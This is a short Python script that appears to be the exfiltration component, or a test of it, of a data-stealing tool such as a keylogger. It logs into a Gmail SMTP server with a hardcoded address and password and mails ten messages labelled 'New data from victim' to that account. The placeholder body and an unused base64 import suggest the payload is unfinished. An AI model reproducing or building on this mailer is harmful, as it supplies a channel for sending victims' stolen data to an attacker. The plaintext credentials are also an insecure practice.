#!/usr/bin/env python3
import base64
import smtplib
import time


def Mail_it():
    data = 'New data from victim(Base64 encoded)\n'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login("testsmtp1211@gmail.com", "Password1$")
    server.sendmail("testsmtp1211@gmail.com", "testsmtp1211@gmail.com", data)
    server.close()


times_run = 10

while times_run > 0:
    Mail_it()
    time.sleep(5)
    print(f'Sent email # {times_run}')
    times_run -= 1
